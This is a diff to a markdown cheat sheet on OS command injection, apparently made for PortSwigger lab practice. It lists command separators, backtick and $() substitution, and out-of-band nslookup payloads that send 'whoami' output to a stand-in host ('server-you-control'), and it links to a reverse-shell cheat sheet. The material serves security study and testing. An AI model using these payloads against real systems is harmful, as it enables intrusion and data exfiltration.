@@ -5,9 +5,15 @@
 * [General Recon For Comamnd Injection Vulnerabilities](#recon)
 * [Portswigger Labs Cheat Sheet / Payloads](#cheat-sheet)
 
+## Resources
+
+* https://portswigger.net/web-security/os-command-injection
+* https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection
+
 ## Recon
 
-* First step is to perform application mapping and identify any instances where the application appears to be interacting with the underlying OS by calling external processes or accessing the filesystem.  The application may issue OS system commands containing any item of user supplied data (every URL, parameters, cookies, etc.).  It’s recommended to probe all these instances for OS Command Injection.
+* First step is to perform application mapping and identify any instances where the application appears to be interacting with the underlying OS by calling external processes or accessing the filesystem.  
+* The application may issue OS system commands containing any item of user supplied data (every URL, parameters, cookies, etc.).  It’s recommended to probe all these instances for OS Command Injection.
 
 ---
 ---
@@ -18,11 +24,19 @@
 
 * The characters ; | & and newline(URL encoded -> %0a) can be used to batch multiple commands one after another.  Each of these characters should be used when probing for command injection vulnerabilities, as the application may reject some inputs but accept others.
 
-* The backtick ` character can also be used to encapsulate a separate command within a data item being processed by the original command.  This will cause the interpreter to execute this command first before continuing to execute the remaining command String: 
+* The backtick \` character can also be used to encapsulate a separate command within a data item being processed by the original command.  This will cause the interpreter to execute this command first before continuing to execute the remaining command String: 
 
 ```bash
 nslookup `whoami`.server-you-control.net
 ```
+
+### Example
+
+* Many times the injected characters need to be encoded, since they can interfere with the structure of the URL/body parameters.
+
+  * For example, below the & and {space} characters need to be URL encoded (%26 and %20) in order to be treated as part of the injection payload:
+
+![Command Injection](https://github.com/ChrisM-X/Payloads_Cheat-Sheets/blob/main/Web%20Security%20Payloads/Portswigger%20-%20Web%20Security%20Academy/Command%20Injection/Images/CommandInjection-1.png)
 
 ### Simple Command Injection
 
@@ -85,10 +99,11 @@ nslookup `whoami`.server-you-control.net
 & nslookup server-you-control &
 ```
 
-#### Netcat - reverse shell
+#### Reverse Shells
+* https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
 #### DNS Data Exfiltration
-* using backticks \`_command_\` and $(_command_)
+* Using backticks \`_command_\` and $(_command_)
 
 ```bash
 ; nslookup $(whoami).server-you-control ;
